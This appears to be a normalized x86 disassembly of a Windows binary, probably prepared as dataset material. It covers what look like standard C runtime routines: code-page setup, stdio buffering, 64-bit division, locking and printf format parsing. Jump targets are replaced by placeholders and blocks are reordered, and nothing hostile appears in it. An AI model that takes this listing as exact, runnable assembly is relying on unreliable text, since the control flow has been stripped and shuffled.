cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
lea ecx [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
jmp r-xdata
mov [ edx ] bl
lea eax [ esi + ecx ]
or [ eax + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x520 ]
lea edx [ esi + 0x119 ]
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_409080
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_408f42
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_408f42
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_403a9f
push 0xc
push r--data
call sub_4021d0
xor esi esi
mov [ ebp - 0x1c ] esi
call sub_40638a
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_402c45
pop ecx
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403b3c
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
xor eax eax
inc eax
[ esi ] eax
or eax 0xffffffff
[ esi ] eax
jne r-xdata
mov eax esi
call sub_402215
retn
push 0x20
call sub_4019a1
cmp esi rw-data
je r-xdata
push esi
call sub_402bcd
pop ecx
sub_403b45
push 0x10
push r--data
call sub_4021d0
or edi 0xffffffff
call sub_40638a
mov ebx eax
mov [ ebp - 0x20 ] ebx
call sub_403a9f
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_403840
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_402131
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_402215
retn
mov ecx 0x88
mov eax [ ebp - 0x20 ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_403ced
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x68 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
xor eax eax
inc eax
[ ebx ] eax
mov eax [ ebp - 0x20 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_4028d9
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_402bcd
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_402bcd
pop ecx
mov eax [ ebp - 0x20 ]
push 0xd
call sub_402c45
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x1c ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x1c ] ecx
cmp ecx 0x5
jge r-xdata
mov eax [ rw-data ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x1c ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
xor eax eax
inc eax
[ ebx ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403cb7
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_402bcd
pop ecx
sub_403ced
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_403840
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov eax edi
mov [ ebp - 0x1c ] ecx
push esi
call sub_4038ae
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_406fb0
add esp 0xc
imul eax [ ebp - 0x1c ] 0x30
mov [ ebp - 0x20 ] eax
lea eax [ eax + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_403806
add esp 0x4
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x20 ]
lea ecx [ esi + 0xc ]
push 0x6
lea edx [ eax + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx edx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
lea edx [ edx + 0x2 ]
mov [ ecx ] ax
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_40390d
cmp edx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + edx + 0x19 ] al
inc edx
movzx eax [ ecx + 0x1 ]
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_406fb0
mov [ esi + 0x4 ] ebx
add esp 0xc
xor ebx ebx
mov [ esi + 0x21c ] edi
inc ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_4038ae
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_403806
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx edx cl
movzx ecx [ eax ]
jmp r-xdata
xor eax eax
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_403ed8
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_405f5e
and [ esi + 0xc ] 0xffffeeff
xor eax eax
pop ecx
mov [ esi + 0x18 ] eax
mov [ esi ] eax
mov [ esi + 0x8 ] eax
sub_403f09
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_404f52
push eax
call sub_407040
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
push edi
call sub_4040b2
add eax 0x20
cmp esi eax
jne r-xdata
call sub_4040b2
add eax 0x40
cmp esi eax
jne r-xdata
xor edi edi
jmp r-xdata
xor eax eax
xor edi edi
inc edi
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ edi * 4 + rw-data ] 0x0
push ebx
mov ebx 0x1000
jne r-xdata
mov ecx [ edi * 4 + rw-data ]
mov [ esi + 0x8 ] ecx
mov [ esi ] ecx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_402131
mov [ edi * 4 + rw-data ] eax
pop ecx
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
inc eax
pop ebx
jmp r-xdata
sub_403fb0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_404018
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_4020e9
mov [ rw-data ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_4020e9
mov [ rw-data ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_4040b8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_402c45
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4040f7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_402c45
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_404127
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_402daf
pop ecx
pop ebp
retn
sub_404161
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_402daf
pop ecx
pop ebp
retn
sub_40418e
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x270 ]
push ebx
push esi
mov [ ebp - 0x230 ] eax
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x210 ] eax
xor eax eax
mov ebx eax
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x254 ] eax
mov esi eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x238 ] eax
call sub_40281d
call sub_4028d9
mov [ ebp - 0x258 ] eax
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
jne r-xdata
cmp [ ebp - 0x264 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov edx [ ebp - 0x210 ]
test edx edx
je r-xdata
push eax
call sub_404f52
pop ecx
mov ecx eax
cmp ecx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40174b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x268 ]
and [ ecx + 0x70 ] 0xfffffffd
mov dl [ edx ]
xor eax eax
mov [ ebp - 0x224 ] eax
mov ecx eax
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x211 ] dl
mov [ ebp - 0x248 ] dl
test dl dl
je r-xdata
mov edx rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax ecx
mov eax [ ebp - 0x210 ]
cmp ecx 0xffffffff
je r-xdata
mov edx ecx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov ecx rw-data
cmp ecx 0xfffffffe
je r-xdata
test [ edx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x210 ]
jmp [ eax * 4 + jump_table_404cee ]
mov edi [ ebp - 0x244 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
mov [ ebp - 0x244 ] edi
mov edi [ ebp - 0x21c ]
sar eax 0x4
mov [ ebp - 0x244 ] eax
cmp eax 0x7
ja r-xdata
test [ ecx + 0x24 ] 0x80
jne r-xdata
inc eax
mov [ ebp - 0x210 ] eax
test ecx ecx
js r-xdata
xor eax eax
or [ ebp - 0x228 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
xor eax eax
mov [ ebp - 0x228 ] eax
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
xor eax eax
movsx eax dl
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
imul ecx [ ebp - 0x240 ] 0xa
movsx eax dl
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x240 ] eax
test eax eax
jns r-xdata
imul ecx [ ebp - 0x228 ] 0xa
movsx eax dl
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x228 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x228 ] eax
test eax eax
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x21c ] edi
jns r-xdata
mov eax [ ebp - 0x210 ]
mov al [ eax ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x248 ]
call sub_404d0e
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x248 ]
call sub_404d0e
mov ecx [ ebp - 0x210 ]
add esp 0xc
mov al [ ecx ]
inc ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0x210 ] ecx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov ecx [ ebp - 0x220 ]
or ebx 0x4
neg eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x211 ] dl
mov [ ebp - 0x248 ] dl
test dl dl
jne r-xdata
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or ebx 0x20
jmp r-xdata
mov eax [ ebp - 0x210 ]
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x218 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x32
jne r-xdata
mov eax edi
add eax 0x2
or ebx 0x8000
jmp r-xdata
cmp [ eax ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov edx [ ebp - 0x228 ]
mov ecx 0x7fffffff
cmp edx 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x228 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x21c ] edi
xor esi esi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x210 ]
jne r-xdata
cmp al 0x69
je r-xdata
mov eax edi
add eax 0x2
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
inc eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
mov ecx edx
mov [ ebp - 0x224 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x224 ] 0x10
pop eax
mov [ ebp - 0x254 ] eax
test bl bl
jns r-xdata
cmp [ ebp - 0x24c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
test bl 0x40
je r-xdata
add edi 0x4
xor esi esi
mov [ ebp - 0x21c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp al 0x6f
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x220 ]
test bl 0x40
je r-xdata
mov eax [ ebp - 0x228 ]
lea esi [ ebp - 0x20c ]
or ebx 0x40
mov ecx 0x200
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x23c ] ecx
test eax eax
jns r-xdata
cmp eax 0x69
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi esi
jg r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
add dl 0x20
mov [ ebp - 0x25c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax esi
jmp r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x238 ] 0x1
mov eax esi
test ecx ecx
je r-xdata
mov esi [ rw-data ]
push eax
call sub_402bcd
xor eax eax
pop ecx
mov [ ebp - 0x250 ] eax
mov edi [ ebp - 0x240 ]
sub edi [ ebp - 0x224 ]
mov eax [ ebp - 0x234 ]
sub edi eax
test bl 0xc
jne r-xdata
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x228 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
mov edx [ ebp - 0x228 ]
test edx edx
jns r-xdata
mov edi esi
jl r-xdata
mov ecx [ edi - 0x4 ]
mov edi esi
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
sub eax esi
sar eax 0x1
jmp r-xdata
xor edx edx
push [ ebp - 0x258 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call sub_404d82
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_404d56
mov eax [ ebp - 0x234 ]
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp eax ecx
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x21c ] edi
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x270 ]
push eax
push [ ebp - 0x25c ]
movsx eax dl
push [ ebp - 0x228 ]
push eax
push [ ebp - 0x23c ]
lea eax [ ebp - 0x278 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
call sub_401c58
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
and ebx 0xfffffff7
mov eax 0x200
mov [ ebp - 0x218 ] ebx
cmp edx eax
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi esi
neg edi
or ebx 0x100
mov [ ebp - 0x218 ] ebx
cmp ecx esi
jae r-xdata
cdq
mov ecx eax
mov edi edx
jmp r-xdata
mov [ ebp - 0x224 ] eax
movsx eax [ eax ]
test ebx 0x800
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax esi
add eax 0x2
test ecx ecx
jne r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x224 ]
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp eax 0xa3
jle r-xdata
mov eax ecx
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x228 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x228 ] 0x0
jne r-xdata
mov eax [ ebp - 0x220 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x224 ] 0x8
test bl bl
jns r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx eax
xor ecx ecx
mov [ ebp - 0x238 ] ecx
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x238 ] 0x1
sar eax 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x224 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x224 ]
push eax
call sub_409281
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x244 ] eax
jmp r-xdata
inc eax
dec ecx
cmp [ eax ] dx
je r-xdata
push [ ebp - 0x258 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
push esi
call sub_404d82
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x30
call sub_404d56
add esp 0x10
mov [ ebp - 0x22c ] 0x20
lea edi [ eax + 0x15d ]
push edi
call sub_402131
mov dl [ ebp - 0x211 ]
mov [ ebp - 0x250 ] eax
pop ecx
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x270 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea esi [ ebp - 0xd ]
mov [ ebp - 0x234 ] esi
lea esi [ ebp - 0x20c ]
jmp r-xdata
mov [ ebp - 0x24c ] 0x1
jmp r-xdata
mov [ ebp - 0x238 ] eax
lea eax [ ebp - 0x270 ]
push eax
movzx eax dl
push eax
call sub_4082ba
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x250 ]
test eax eax
je r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x228 ] 0xa3
mov esi eax
mov [ ebp - 0x23c ] edi
jmp r-xdata
push esi
call sub_408310
pop ecx
jmp r-xdata
or ebx 0x100
inc esi
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea eax [ ebp - 0x270 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x24c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x224 ]
cdq
push edx
push eax
push edi
push ecx
call sub_408630
add ecx 0x30
mov [ ebp - 0x27c ] ebx
mov [ ebp - 0x23c ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_404d56
add esp 0x10
or ecx 0xffffffff
mov [ ebp - 0x220 ] ecx
jmp r-xdata
cmp [ ebp - 0x260 ] eax
je r-xdata
mov edi [ ebp - 0x21c ]
mov edx [ ebp - 0x228 ]
mov [ esi ] cl
dec esi
mov ecx [ ebp - 0x23c ]
jmp r-xdata
add ecx [ ebp - 0x254 ]
mov ebx [ ebp - 0x218 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
mov [ ebp - 0x224 ] eax
test ebx 0x200
je r-xdata
test ecx ecx
js r-xdata
push [ ebp - 0x258 ]
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0x260 ]
push eax
